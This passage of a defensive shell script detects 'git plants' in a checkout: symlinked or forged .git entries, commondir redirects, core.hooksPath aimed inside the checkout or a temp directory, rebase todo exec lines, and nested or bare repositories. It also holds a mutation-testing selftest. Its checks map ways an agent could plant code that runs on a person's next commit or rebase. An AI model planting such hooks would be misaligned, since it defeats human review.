  if git_env_redirected; then gp_i "a git environment variable redirects git (GIT_DIR or GIT_WORK_TREE): no git was run and no config was read"; gp_nogit=1; fi
  if [ -L ./.git ]; then
    gp_w "./.git is a symlink (P2): git follows it to a repository this directory does not own. No git was run and no config was read"; gp_nogit=1   # MUT-GPNOGIT
  elif [ -f ./.git ]; then
    gp_i "./.git is a gitfile (P9): this session is a linked worktree or a submodule, or a plant; this check cannot tell which. It ran no git and read no config, and nothing nested is classified"; gp_nogit=1
  elif [ -d ./.git ]; then
    if [ -e ./.git/commondir ] || [ -L ./.git/commondir ]; then
      gp_w "./.git/commondir exists (P6): git reads it for any git directory and takes objects and refs from the directory it names. No git was run and no config was read"; gp_nogit=1   # MUT-GPNOGIT
    fi
    gp_guard_files   # MUT-GPGUARD
    if [ "$gp_nogit" -eq 0 ] && ! { { [ -f ./.git/HEAD ] || [ -L ./.git/HEAD ]; } && [ -d ./.git/objects ] && [ -d ./.git/refs ]; }; then   # MUT-GPREPO
      gp_w "./.git lacks HEAD, objects or refs, so it is not a git repository and git would discover one upward. No git was run and no config was read"; gp_nogit=1
    fi
  else
    gp_w "./.git is a special file, not a directory or a gitfile: it was not opened. No git was run and no config was read"; gp_nogit=1   # MUT-GPNOGIT
  fi
}
gp_hookin() {  # <core.hooksPath value> -> 0 when it lies inside this checkout: relative, ~ expanded with the real HOME, or an absolute path with $gp_root or $gp_rootp as a PREFIX; a value with .., // or /./ in it, one under /proc, or one that cannot be expanded, counts as inside. CEILING: nothing else is resolved, so an absolute value that reaches the checkout through a symlink or a case variant of its path is missed. Leaves the expanded value in gp_hq
  gp_hq=$1
  # shellcheck disable=SC2088  # the quoted ~ patterns match git's own literal tilde in a config VALUE (git expands it itself); the shell must not
  case "$gp_hq" in
    '~') gp_hq=${HOME:-} ;;
    '~/'*) gp_hq=${HOME:-}/${gp_hq#'~/'} ;;
    '~'*) return 0 ;;
  esac
  case "$gp_hq" in /*) : ;; *) return 0 ;; esac   # MUT-GPHOOKS
  case "$gp_hq" in *..*|*//*|*/./*|*/.|/proc|/proc/*) return 0 ;; esac
  case "$gp_hq" in "$gp_root"|"$gp_root"/*|"$gp_rootp"|"$gp_rootp"/*) return 0 ;; esac
  return 1
}
gp_hookspath() {  # P13: core.hooksPath set to a place inside the checkout, in ./.git/config or ./.git/config.worktree (the value is read, never printed)
  for gp_hf in "$gp_root/.git/config" "$gp_root/.git/config.worktree"; do
    { [ -f "$gp_hf" ] && [ ! -L "$gp_hf" ]; } || continue
    if ! gp_hv=$(gp_cfgread "$gp_hf" --get core.hooksPath 2>/dev/null); then gp_hv=""; fi
    [ -n "$gp_hv" ] || continue
    if gp_hookin "$gp_hv"; then
      gp_w "core.hooksPath in ./${gp_hf#"$gp_root"/} points inside this checkout (P13): a script an agent edits there runs on your next commit before you review it (the value is not printed)"
    else
      case "$gp_hq" in /tmp|/tmp/*|/private/tmp|/private/tmp/*|/var/tmp|/var/tmp/*|/private/var/tmp|/private/var/tmp/*|/var/folders|/var/folders/*|/private/var/folders|/private/var/folders/*|/dev/shm|/dev/shm/*) gp_w "core.hooksPath in ./${gp_hf#"$gp_root"/} points under a temp directory, where a sandboxed agent can write (P13; the value is not printed)" ;; esac
    fi
  done
}
gp_todo_read() {  # <file> -> 0 when it holds an exec line, 1 when it does not; any other grep result (no grep, an error) reads UNVERIFIED, never clean
  gp_tr=0; grep -Eq '^[[:space:]]*(exec|x)([[:space:]]|$)' "$1" 2>/dev/null || gp_tr=$?
  case "$gp_tr" in 0) return 0 ;; 1) return 1 ;; esac
  gp_unv=1; return 1   # MUT-GPTODO
}
gp_each() {  # <find output> <handler> <text for an unprintable name> [unv]: calls the handler with each printable name; GPERR (a failed walk) reads UNVERIFIED; the name behind UNSAFE is never shown (with a 4th word it reads UNVERIFIED too)
  while IFS= read -r gp_e; do
    case "$gp_e" in
      "") continue ;;
      GPERR) gp_unv=1 ;;
      UNSAFE) gp_w "$3"; [ -z "${4:-}" ] || gp_unv=1 ;;   # MUT-GPEACH
      *) "$2" "$gp_e" ;;
    esac
  done <<GPEOF
$1
GPEOF
}
gp_todo_one() {  # <path>: the walk lists the objects directories it prunes; they are skipped
  if [ "${1%/objects}" != "$1" ]; then return 0; fi
  if ! { [ -f "$1" ] && [ ! -L "$1" ]; }; then gp_w "$1 is a link or not a regular file (P10): it was not read"; return 0; fi
  if gp_todo_read "$1"; then gp_w "$1 holds an exec line (P10): it runs on the next 'git rebase --continue' (the line is not printed)"; fi
}
gp_todos() {  # P10: a pending rebase or sequencer todo in ./.git, in a worktree entry (./.git/worktrees/*/) or in a submodule git directory (./.git/modules/**/); the objects directories are not entered
  gp_out=$(gp_find ./.git '(' -name objects -prune -o -name git-rebase-todo -o -path '*/sequencer/todo' ')' || printf 'GPERR\n')
  gp_each "$gp_out" gp_todo_one "a rebase or sequencer todo has a path it withholds (unprintable, or shaped like a credential) (P10); the name is not shown"
}
gp_dotgit_files() {  # the plain files inside a real ./.git
  { [ -d ./.git ] && [ ! -L ./.git ]; } || return 0
  [ "$gp_nogit" -eq 0 ] || return 0
  gp_hookspath
  gp_cfg "$gp_root/.git/config" "./.git/config"
  gp_cfg "$gp_root/.git/config.worktree" "./.git/config.worktree"
  gp_todos
  if [ -e ./.git/info/exclude ] || [ -L ./.git/info/exclude ]; then
    if ! { [ -f ./.git/info/exclude ] && [ ! -L ./.git/info/exclude ]; }; then gp_w "./.git/info/exclude is a link or not a regular file: it was not read"
    else
      gp_n=$(grep -Evc '^[[:space:]]*(#|$)' ./.git/info/exclude 2>/dev/null || true)
      [ "${gp_n:-0}" = 0 ] || gp_i "./.git/info/exclude holds $gp_n pattern line(s) (P11): they hide files from git status. Count only; open it yourself to read them"
    fi
  fi
}
gp_one_wt() {  # <./.git/worktrees/NAME>: its commondir must be the plain ../.. (P5); its gitdir file and the back-link are NOT read (an agent can forge both); its config and config.worktree are scanned
  gp_wn=$(gp_show "$1")
  if [ -L "$1" ] || [ ! -d "$1" ]; then gp_w "$gp_wn is a symlink or not a directory (P5)"; return 0; fi
  if ! { [ -L "$1/HEAD" ] || [ -f "$1/HEAD" ]; }; then gp_w "$gp_wn/HEAD is not a regular file or a symlink (P5): a FIFO there can block the dirty check's git status"; fi   # MUT-GPWTHEAD
  if ! gp_one "$1/commondir"; then gp_w "$gp_wn has no regular one-line commondir (P5): git then reads the entry as a self-contained git directory with its own config"   # MUT-GPCOMMON
  elif [ "$gp_1v" != ../.. ]; then gp_w "$gp_wn commondir is not ../.. (P5): git would take this worktree's objects and refs from another directory"
  fi
  gp_cfg "$gp_root/${1#./}/config" "$gp_wn/config" wt
  gp_cfg "$gp_root/${1#./}/config.worktree" "$gp_wn/config.worktree" wt
}
gp_worktrees() {
  if [ -L ./.git/worktrees ] || { [ -e ./.git/worktrees ] && [ ! -d ./.git/worktrees ]; }; then gp_w "./.git/worktrees is a link or not a directory: its entries were not walked"; return 0; fi
  [ -d ./.git/worktrees ] || return 0
  gp_out=$(gp_find ./.git/worktrees -mindepth 1 -maxdepth 1 || printf 'GPERR\n')
  gp_each "$gp_out" gp_one_wt "a worktree entry has a name it withholds (unprintable, or shaped like a credential) (P5); the name is not shown"
}
gp_mod_cd() {  # <a commondir under ./.git/modules>
  case "$1" in
    */worktrees/?*/commondir) if gp_one "$1" && [ "$gp_1v" = ../.. ]; then :   # a real submodule linked worktree's entry
      else gp_w "$1 is not the plain ../.. a submodule worktree entry holds (P7): git would take objects and refs from where it points"; fi ;;
    *) gp_w "$1 exists (P7): git reads a commondir for any git directory, including a submodule's or its worktree entry" ;;
  esac
}
gp_mod_hook() { gp_w "$1 is a hook file in a submodule git directory (P7): git runs it on that submodule's operations"; }
gp_mod_head() {  # <a HEAD under ./.git/modules>: its directory is a module git directory when it has objects or a commondir (logs/HEAD and refs/remotes/origin/HEAD have neither)
  gp_md=${1%/*}
  { [ -d "$gp_md/objects" ] || [ -e "$gp_md/commondir" ] || [ -L "$gp_md/commondir" ]; } || return 0
  gp_cfg "$gp_root/${gp_md#./}/config" "$gp_md/config" module
  if [ -L "$gp_md/hooks" ]; then
    gp_w "$gp_md/hooks is a link (P7): git runs hooks from where it points"
  elif [ -d "$gp_md/hooks" ]; then
    gp_hk=$(gp_find "$gp_md/hooks" -mindepth 1 '(' -type f -o -type l ')' ! -name '*.sample' || printf 'GPERR\n')
    gp_each "$gp_hk" gp_mod_hook "a hook file under $gp_md/hooks has a name it withholds (unprintable, or shaped like a credential) (P7); the name is not shown"
  fi
}
gp_modules() {
  if [ -L ./.git/modules ] || { [ -e ./.git/modules ] && [ ! -d ./.git/modules ]; }; then gp_w "./.git/modules is a link or not a directory: its submodule git directories were not walked"; return 0; fi
  [ -d ./.git/modules ] || return 0
  gp_out=$(gp_find ./.git/modules -iname commondir || printf 'GPERR\n')
  gp_each "$gp_out" gp_mod_cd "a commondir under ./.git/modules has a name it withholds (unprintable, or shaped like a credential) (P7); the name is not shown"
  gp_out=$(gp_find ./.git/modules -iname HEAD '(' -type f -o -type l ')' || printf 'GPERR\n')   # every module git directory, found by its HEAD (not by its config, which may be missing or a link)
  gp_each "$gp_out" gp_mod_head "a module config has a path it withholds (unprintable, or shaped like a credential) (P7); the name is not shown"
}
gp_registered() {  # <./path/.git> -> 0 when the index registers that path as a submodule
  case "
$gp_links
" in *"
$1
"*) return 0 ;; esac
  return 1
}
gp_gt() {  # <gitfile> -> 0 and gp_xp = the physical directory a one-line "gitdir: <path>" gitfile names (a relative path resolves against the gitfile's directory); 1 otherwise
  gp_xp=""
  gp_one "$1" || return 1
  case "$gp_1v" in "gitdir: "?*) : ;; *) return 1 ;; esac
  gp_xt=${gp_1v#gitdir: }
  case "$gp_xt" in /*) : ;; *) gp_xt=${1%/*}/$gp_xt ;; esac
  gp_xp=$(CDPATH='' cd -P "$gp_xt" 2>/dev/null && pwd -P) || { gp_xp=""; return 1; }
}
gp_one_nested() {  # <./path/.git> (a printable name found below the checkout root)
  gp_reg=0   # MUT-GPNEST
  gp_registered "$1" && gp_reg=1
  gp_nm=$(gp_show "$1")
  if [ -L "$1" ]; then
    if [ "$gp_reg" -eq 1 ]; then gp_w "$gp_nm: a registered submodule's .git is a symlink (P12)"; else gp_w "$gp_nm: unregistered .git symlink (P2): git follows it to a repository this directory does not own"; fi
  elif [ -d "$1" ]; then
    if [ "$gp_reg" -eq 1 ]; then gp_w "$gp_nm: a registered submodule's .git is a directory (P12)"; else gp_w "$gp_nm: unregistered .git directory (P3): git reads its config and hooks"; fi
    gp_cfg "$gp_root/${1#./}/config" "$gp_nm/config" nested
  elif [ -f "$1" ]; then   # MUT-GPFIFO
    gp_nested_file "$1"
  else
    gp_w "$gp_nm: a special file named .git: it was not opened"
  fi
}
gp_nested_file() {  # <gitfile>
  if [ "$gp_nogit" -ne 0 ]; then
    gp_w "$gp_nm: a nested .git file that cannot be classified (no git was run, so the registered submodules are unknown)"; return 0
  fi
  gp_gt "$1" || gp_xp=""
  if [ "$gp_reg" -eq 1 ]; then
    case "$gp_xp" in
      "$gp_rootp"/.git/modules/?*) : ;;   # MUT-GPSUB
      *) gp_w "$gp_nm: a registered submodule's gitfile is not one plain line naming a directory under ./.git/modules (P12): git would follow it to another directory"; return 0 ;;
    esac
    case "$1" in *[!A-Za-z0-9._/-]*) : ;; *) gp_i "to refuse a rewrite of $gp_nm add, in .claude/settings.local.json (a person's act): denyWrite \"$1\" and permissions.deny \"Edit($1)\"" ;; esac   # MUT-GPROW
    return 0
  fi
  gp_wk=${gp_xp#"$gp_rootp"/.git/worktrees/}
  if [ "$gp_wk" != "$gp_xp" ] && [ -n "$gp_wk" ] && [ "${gp_wk#*/}" = "$gp_wk" ]; then
    gp_i "$gp_nm: names ./.git/worktrees/<one name>. It is a linked worktree of this repository or a plant, and this check cannot tell which (the records git keeps for a worktree are files an agent can forge)"; gp_cant=1; return 0   # MUT-GPWT
  fi
  case "$gp_xp" in   # a recursive submodule: its gitfile names ./.git/modules/<a>/modules/<b>, but only its parent's index lists it, and that index is not read
    "$gp_rootp"/.git/modules/?*/modules/?*) gp_i "$gp_nm: names a recursive submodule's git directory under ./.git/modules. Its parent submodule's index is not read, so this check cannot tell it from a plant of that shape"; gp_recur=1; return 0 ;;   # MUT-GPRECUR
  esac
  gp_w "$gp_nm: unregistered .git file (P1, P4): git follows it to the directory it names (its content is not printed)"
}
gp_nested() {
  gp_links=""; gp_lkfail=0
  if [ "$gp_nogit" -eq 0 ]; then
    gp_ls=$(gp_git ls-files --stage 2>/dev/null) || gp_lkfail=1
    gp_tab=$(printf '\t')
    while IFS= read -r gp_l; do
      case "$gp_l" in
        "160000 "*) gp_pp=${gp_l#*"$gp_tab"}; case "$gp_pp" in '"'*) gp_w "a submodule with an unusual name is not classified (the index lists it quoted, so it is not matched to its .git)" ;; *) gp_links="$gp_links
./$gp_pp/.git" ;; esac ;;
      esac
    done <<GPEOF
$gp_ls
GPEOF
    [ "$gp_lkfail" -eq 0 ] || gp_w "UNVERIFIED: git did not read the index (no cause is claimed: an index or ./.git git rejects, or no git on the PATH), so the registered submodules are unknown and each nested .git is reported"
  fi
  # ONE walk, three kinds of entry: a .git (pruned), a HEAD file or link (a bare layout, P8), and a symlink (a link to a directory hides what is inside it, M3)
  gp_out=$(gp_find . '(' -iname .git -prune -o -iname HEAD '(' -type f -o -type l ')' -o -type l ')' || printf 'GPERR\n')
  gp_each "$gp_out" gp_nest_one "a .git, HEAD or link entry sits below a name it withholds (unprintable, or shaped like a credential); the name is not shown (it could not be classified)" unv
}
gp_nest_one() {  # <a path from the one walk>
  case "$1" in
    ./.git) return 0 ;;   # MUT-GPWALK2
    */.[Gg][Ii][Tt]) gp_one_nested "$1" ;;
    */[Hh][Ee][Aa][Dd]) gp_bare "${1%/*}" ;;
    *) gp_linkdir "$1" ;;
  esac
}
gp_layout() {  # <directory> -> 0 when git would take it as a git directory (HEAD plus objects and refs, or a commondir)
  { [ -d "$1/objects" ] && [ -d "$1/refs" ]; } || [ -e "$1/commondir" ] || [ -L "$1/commondir" ]   # MUT-GPLAYOUT
}
gp_bare() {  # <dir holding a HEAD> P8: a bare-layout directory (the root itself included) below or at the checkout root
  [ ! -L "$1" ] || return 0
  gp_layout "$1" || return 0
  gp_w "$(gp_show "$1") is a bare repository layout (P8): git enters it implicitly and reads its config. A person's act closes it for their own git: git config --global safe.bareRepository explicit (git 2.38+; it affects tools that enter a bare repository without --git-dir)"
}
gp_linkdir() {  # <symlink> M3: a link to a directory that holds a .git or a git directory layout hides a plant from the walk (it is not followed); one level is checked, nothing from the target is printed
  [ -d "$1" ] || return 0   # MUT-GPLINK
  { [ -e "$1/.git" ] || [ -L "$1/.git" ] || { { [ -e "$1/HEAD" ] || [ -L "$1/HEAD" ]; } && gp_layout "$1"; }; } || return 0
  gp_w "$(gp_show "$1") is a link to a directory that holds a .git or a git directory layout: the walk does not follow links, and git does"
}
check_git_plants() { ( LC_ALL=C; export LC_ALL; gp_main ); }   # C locale: [:print:] refuses every non-ASCII byte, so a bidi mark or a lookalike cannot dress a printed name; the subshell keeps the locale and the gp_ state out of the caller
gp_main() {
  gp_warn=0; gp_nogit=0; gp_unv=0; gp_cant=0; gp_recur=0
  if [ ! -e ./.git ] && [ ! -L ./.git ]; then
    printf '%s\n' "  skip git-plants — no ./.git here (not a repository root, or run from a subfolder): nothing was read"; return 0
  fi
  gp_root=$(pwd) || gp_root=""
  gp_rootp=$(pwd -P) || gp_rootp=""
  gp_top
  gp_dotgit_files
  gp_worktrees
  gp_modules
  gp_nested
  [ "$gp_unv" -eq 0 ] || gp_w "UNVERIFIED: some paths could not be read (a permission error stopped part of the walk), so the checkout is not cleared"
  # the unverified lines print whatever else was found (a warning beside one must not hide it); doctor exempts only the worktree-shaped one (gp_cant) from its dirty-check gate
  [ "$gp_nogit" -eq 0 ] || printf '%s\n' "  unverified git-plants: no git was run and no config was read here, so this checkout is not cleared (a report never says clean about what it did not read)"   # MUT-GPUNV
  [ "$gp_cant" -eq 0 ] || printf '%s\n' "  unverified git-plants: a nested .git file names a worktree entry of this repository: a linked worktree or a plant, and this check cannot tell which, so this checkout is not cleared (see the info above)"   # MUT-GPCANT
  [ "$gp_recur" -eq 0 ] || printf '%s\n' "  unverified git-plants: a nested .git file names a recursive submodule's git directory, whose parent index is not read, so this checkout is not cleared (see the info above)"
  if [ "$gp_warn" -eq 0 ] && [ "$gp_nogit" -eq 0 ] && [ "$gp_cant" -eq 0 ] && [ "$gp_recur" -eq 0 ]; then
    printf '%s\n' "  ok   git-plants: nothing found in this checkout (known keys only: the list of exec keys is not git's whole set; this reports, it does not certify)"
  fi
  gp_i "this reports after the fact: git run before preflight or doctor (Claude Code's own start-up git included) may already have run a plant"   # MUT-GPSTATUS
  return 0
}

# --- SWAS-784 / SWAS-785: which tree is this? ---------------------------------------------------
# preflight reports on the directory it is run in. In the kit checkout, or in a directory that is no project at all, a report read as
# an all-clear for the wrong tree (rehearsal A, findings #3 and #6). The class below answers exactly one of incepted | kit | export | other,
# first match wins. It runs as the first act of the main body, so nothing is reported before it; the early-exit modes (--selftest,
# --git-plants-only, --boundary-only, --url-kind) exit before the main body and are unchanged.
project_root_top() {  # -> stdout: T, the git toplevel, only inside a work tree with no git environment redirect (as guard_tree_class anchors) and only when it differs from $PWD; else nothing
  _prt=""
  if ! git_env_redirected; then _prt=$(git rev-parse --show-toplevel 2>/dev/null) || _prt=""; fi
  if [ "$_prt" = "$PWD" ] || [ "$_prt" = "$(pwd -P)" ]; then _prt=""; fi
  printf '%s\n' "$_prt"
}
prc_has_marker() {  # <dir> -> rc 0 iff a KIT_INTERNAL_MARKERS marker sits in <dir>, 1 iff none, 2 when the marker list cannot be read
  # the one-line list incept.sh refuses on, read from the incept.sh beside this script by the parse scripts/adopter-export.sh uses. Missing, unreadable or empty
  # refuses: an empty list would read the kit as an export.
  _phm_list=$(sed -n "s/^KIT_INTERNAL_MARKERS='\\(.*\\)'.*/\\1/p" "$(dirname -- "$0")/incept.sh" 2>/dev/null) || _phm_list=""
  [ -n "$_phm_list" ] || return 2   # MUT-PRLIST
  case $- in *f*) _phm_nf=1 ;; *) _phm_nf=0 ;; esac   # restore the caller's noglob state, never assume it was off
  set -f   # the markers are glob-free literals; no pathname expansion on the split
  _phm_rc=1
  for _phm_m in $_phm_list; do
    if [ -e "$1/$_phm_m" ]; then _phm_rc=0; break; fi
  done
  [ "$_phm_nf" -eq 1 ] || set +f
  return "$_phm_rc"
}
prc_is_principles() {  # <dir> -> rc 0 iff <dir>/CLAUDE.md carries the principles heading, the marker incept keys on
  [ -f "$1/CLAUDE.md" ] && grep -q "Engineering Principles & Definition of Done" "$1/CLAUDE.md" 2>/dev/null
}
project_root_is_kit_root() {  # <dir> -> rc 0 iff <dir> is the kit root: a marker AND the principles CLAUDE.md, and no ENGINEERING-PRINCIPLES.md; rc 2 when the marker list cannot be read
  if [ -f "$1/ENGINEERING-PRINCIPLES.md" ]; then return 1; fi
  _pkr_rc=0; prc_has_marker "$1" || _pkr_rc=$?
  [ "$_pkr_rc" -eq 0 ] || return "$_pkr_rc"
  prc_is_principles "$1"   # MUT-PRKROOT
}
project_root_class() {  # <dir> -> stdout: incepted | kit | export | other ; rc 2 (nothing printed) when the kit-internal marker list cannot be read
  _prc_a=$1
  # incepted FIRST: ENGINEERING-PRINCIPLES.md is inception's own artifact and the kit source never has it, so an incepted adopter tree is never read as the kit
  # (a plugin may create docs/superpowers or .superpowers in an adopter tree, and both are kit markers).
  if [ -f "$_prc_a/ENGINEERING-PRINCIPLES.md" ]; then echo incepted; return 0; fi   # MUT-PRINC
  _prc_h=0; prc_has_marker "$_prc_a" || _prc_h=$?
  [ "$_prc_h" -ne 2 ] || return 2
  if [ "$_prc_h" -eq 0 ]; then echo kit; return 0; fi
  # export: the principles CLAUDE.md, the marker incept keys on. An export is not a git repo before incept, so the test is the file, not git.
  if prc_is_principles "$_prc_a"; then echo export; return 0; fi
  echo other
}
project_root_resolve() {  # sets PROJECT_CLASS and _prc_anchor (the directory whose class applied); rc 2 when the marker list cannot be read. The errata's anchor rule (SWAS-784):
  # T is the git toplevel and $PWD is the directory itself; each is classified by project_root_class's order. 1: T is the kit root -> kit. 2: $PWD reads anything but other -> that.
  # 3: else T's class, or other when there is no T. A package that is itself a project reads by itself; anything inside the kit root is the kit; a subdirectory of an incepted repo reads incepted.
  _prs_t=$(project_root_top)
  _prs_r=0
  if [ -n "$_prs_t" ]; then
    project_root_is_kit_root "$_prs_t" || _prs_r=$?
    [ "$_prs_r" -ne 2 ] || return 2
    if [ "$_prs_r" -eq 0 ]; then PROJECT_CLASS=kit; _prc_anchor=$_prs_t; return 0; fi   # MUT-PRKROOT1
  fi
  PROJECT_CLASS=$(project_root_class "$PWD") || return 2   # MUT-PRPWD
  _prc_anchor=$PWD
  if [ "$PROJECT_CLASS" = other ] && [ -n "$_prs_t" ]; then   # MUT-PRFALLBACK
    PROJECT_CLASS=$(project_root_class "$_prs_t") || return 2
    _prc_anchor=$_prs_t
  fi
  return 0
}
prc_show() {  # <path> -> a path safe to print: a control character replaces the whole path (RULE 2); callers print it with printf '%s\n' (RULE 3)
  if guard_path_hostile "$1"; then printf '%s\n' '<unprintable path>'; else printf '%s\n' "$1"; fi   # MUT-PRHOSTILE
}
prc_refuse_other() {  # exit 1 before any report line, writing nothing
  printf '%s\n' "preflight: $(prc_show "$PWD") is not a project root. It is neither an exported Sparkwright kit (a CLAUDE.md with the principles heading) nor an incepted project (ENGINEERING-PRINCIPLES.md). cd to your project's root and re-run." >&2
  exit 1
}

# SEAMS: are the test injection seams (PREFLIGHT_GIT_VERSION_CMD) live? Only an explicit FLAG turns them
# on — never the ambient environment. Default 0 = a real adopter run reports on the real machine.
STACK=""; SELFTEST=0; ALLOW_NESTED=0; SEAMS=0; ALLOW_RUNTIME_MISMATCH=0; BOUNDARY_ONLY=0; BOUNDARY_ADVISORY=0; BOUNDARY_OFFLINE=0; SELFTEST_CELL=""; GIT_PLANTS_ONLY=0
while [ $# -gt 0 ]; do
  case "$1" in
    --stack) [ $# -ge 2 ] || { echo "preflight: --stack requires a value" >&2; exit 2; }; STACK=$2; shift 2 ;;
    # --boundary-only: print only the boundary block and exit with its verdict (0 / 1 UNDECLARED or malformed / 2 unverified); `sparkwright doctor --boundary` runs it.
    --boundary-only) BOUNDARY_ONLY=1; shift ;;
    # --boundary-advisory: the boundary lines print as usual, but `bfail` never reaches the exit. For every caller that reads this script's rc for something
    # else (incept, repo-ownership, this script's own --selftest-e2e calls). An open hatch for anyone, stated in the design (section 10 item 13).
    --boundary-advisory) BOUNDARY_ADVISORY=1; shift ;;
    # --boundary-offline (S20, owner ruling "355a: B revised"): a TYPED flag, never an environment variable. A human who is offline (or cannot reach origin) says so: an
    # unreadable declaration is then a loud WARN instead of a FAIL. It never relaxes UNTRUSTED, UNDECLARED or MALFORMED.
    --boundary-offline) BOUNDARY_OFFLINE=1; shift ;;
    # --git-plants-only (SWAS-473 C1): print only the checkout-git report (parse-only, never moves the exit) and exit 0; `sparkwright doctor` runs it.
    --git-plants-only) GIT_PLANTS_ONLY=1; shift ;;
    --selftest)SELFTEST=1; SEAMS=1; shift ;;
    # --selftest-e2e: internal. Runs the REAL body with the injection seams live, so --selftest can prove
    # the git-floor check is WIRED end-to-end (a defined-but-uncalled check is decorative) without an
    # ambient env var being able to do the same thing in an adopter's shell. Not in --help: it is a test
    # seam, not a user-facing option, and the flag IS the authorization.
    --selftest-e2e) SEAMS=1; shift ;;
    # --selftest-cell <name> (SWAS-487): internal. With --selftest it runs ONE named cell instead of the whole selftest (only case-variant is accepted), so the prepush lane
    # can grade that cell's mutants without running ~3300 lines five times. Not in --help: it is a test seam, not a user-facing option, and the flag IS the authorization.
    # A FLAG, never an environment variable (FLAG-NOT-ENV): SELFTEST_CELL is set to "" on the init line above, so an exported value is never read.
    --selftest-cell)
      case "${2:-}" in
        case-variant) SELFTEST_CELL=$2; shift 2 ;;
        *) echo "preflight: --selftest-cell requires a cell name (case-variant)" >&2; exit 2 ;;
      esac ;;
    --allow-nested) ALLOW_NESTED=1; shift ;;
    # --url-kind <url> (SWAS-680): read-only, runs no git and exits before anything else. Prints remote | local | helper, the one classifier above; a value starting with `-` is `helper`, so a caller never hands git an option. Doctor and kit-current read it.
    --url-kind)
      [ $# -ge 2 ] || { echo "preflight: --url-kind requires a url" >&2; exit 2; }
      case "$2" in -*) printf '%s\n' helper ;; *) boundary_url_kind "$2" ;; esac
      exit 0 ;;
    # --allow-runtime-mismatch: the NAMED escape from the stack's runtime floor. It proceeds on an
    # unsupported runtime, loudly, and suppresses the clean green — see the runtime-floor block above.
    --allow-runtime-mismatch) ALLOW_RUNTIME_MISMATCH=1; shift ;;
    -h|--help) echo "usage: preflight.sh [--stack <name>] [--allow-runtime-mismatch] [--selftest] [--allow-nested] [--boundary-only] [--boundary-advisory] [--boundary-offline] [--git-plants-only] [--url-kind <url>]"; exit 0 ;;
    *) printf '%s\n' "preflight: unknown arg: $1" >&2; exit 2 ;;   # Rule 3 — $1 is raw argv
  esac
done

if [ -n "$SELFTEST_CELL" ] && [ "$SELFTEST" -eq 0 ]; then
  echo "preflight: --selftest-cell requires --selftest" >&2
  exit 2
fi

if [ "$SEAMS" -eq 1 ] && [ "$SELFTEST" -eq 0 ]; then
  echo "NOTE: test seams live — not a report on this machine"   # MUT-BANNER
fi

if [ "$SELFTEST" -eq 1 ]; then
  _st_ci=${CI:-}${GITHUB_ACTIONS:-}; unset CI GITHUB_ACTIONS   # S34: capture the runner's CI first (the weak-result branches fail under it), then the selftest is CI-hermetic; cells that test CI set it explicitly   # MUT-HERMETIC
  fail=0
  _pf_skips=0   # the skip counter starts at 0, never inherited from the environment (a stray value would print a false SKIP note and be evaluated as arithmetic)
  # SWAS-487: the boundary section's shared setup and the case-variant cell are functions, so `--selftest-cell case-variant` can run that one cell alone (the prepush lane grades its
  # mutants without running the ~3300-line selftest five times). They sit INSIDE this block, after the hermetic entry line above, so _hm_ok and _stci_ok still read what they read.
  st_bnd_setup() {  # creates $_bnd and off.json; sets _self, _sd, the _g_* scenario globals (what _bnd_run reads) and defines _bnd_run, _bnd_moves, _bnd_kill. Called ONCE per run.
    _bnd=$(mktemp -d)
    printf '{"sandbox":{"enabled":false}}\n' > "$_bnd/off.json"
    _self=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)/$(basename -- "$0"); _sd=$(dirname -- "$_self")
    _g_proj=""; _g_user=""; _g_local=""; _g_mgd=""; _g_decl=""; _g_os=""; _g_env=""; _g_dir=""; _g_path=""; _g_home=""; _g_ci=""; _g_tty=""
    _bnd_run() {  # <script> <flags> -> _br_out, _br_rc
      _br_rc=0
      # shellcheck disable=SC2086  # ${_g_env:-...} is one NAME=value word and $2 is a short flag list
      _br_out=$( if [ -n "$_g_path" ]; then PATH="$_g_path:$PATH"; export PATH; fi
        if [ -n "$_g_home" ]; then HOME="$_g_home"; else mkdir -p "$_bnd/emptyhome"; HOME="$_bnd/emptyhome"; fi   # N2: never the developer's real ~/.gitconfig
        export HOME; GIT_CONFIG_NOSYSTEM=1; export GIT_CONFIG_NOSYSTEM
        cd "${_g_dir:-.}" && env -u CI -u GITHUB_ACTIONS -u SANDBOX_RUNTIME -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_SYSTEM -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_COMMON_DIR -u GIT_OBJECT_DIRECTORY -u GIT_EXEC_PATH ${_g_env:-KIT_UNUSED=1} ${_g_ci:+CI=true} ${_g_tty:+PREFLIGHT_TTY_SEAM=$_g_tty} PREFLIGHT_SANDBOX_SETTINGS="$_g_proj" PREFLIGHT_SANDBOX_LOCAL="${_g_local:-/nonexistent-local}" PREFLIGHT_SANDBOX_USER="${_g_user:-/nonexistent-user}" PREFLIGHT_SANDBOX_MANAGED="${_g_mgd:-/nonexistent-managed}" PREFLIGHT_SANDBOX_OS="${_g_os:-Darwin}" PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_SANDBOX_BWRAP_OK=1 PREFLIGHT_BOUNDARY_OPTOUT="${_g_decl:-@absent}" PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ sh "$1" --selftest-e2e $2 2>&1 ) || _br_rc=$?
    }
    _bnd_moves() {  # <script> -> _mv = yes iff bfail moves the exit in the current scenario (the plain rc differs from the advisory rc)
      _bnd_run "$1" ""; _mv_plain=$_br_rc
      _bnd_run "$1" "--boundary-advisory"; _mv_adv=$_br_rc
      if [ "$_mv_plain" -ne "$_mv_adv" ]; then _mv=yes; else _mv=no; fi
    }
    # the mutants of the new controls: a sed mutation of a COPY must turn the scenario red (the ORIGINAL prints it, the mutant does not), and must apply and parse.
    _bnd_kill() {  # <name> <sed expr> <flags> <has|moves|rc> <substring | the original's moves value | the original's rc>
      _bk=$(mktemp -d); sed "$2" "$_self" > "$_bk/preflight.sh"; cp "$(dirname -- "$_self")/incept.sh" "$_bk/incept.sh"   # SWAS-784: the copy reads the marker list from the incept.sh beside it
      if cmp -s "$_self" "$_bk/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_bk"; return 0; fi
      if ! sh -n "$_bk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse (a mutant that cannot run would read as killed)"; fail=1; rm -rf "$_bk"; return 0; fi
      if [ "$4" = moves ]; then
        _bnd_moves "$_self"; _bk_a=$_mv; _bk_adv=$_mv_adv; _bnd_moves "$_bk/preflight.sh"; _bk_b=$_mv
        if [ "$_bk_a" != "$5" ] && [ "$_bk_adv" -ne 0 ]; then
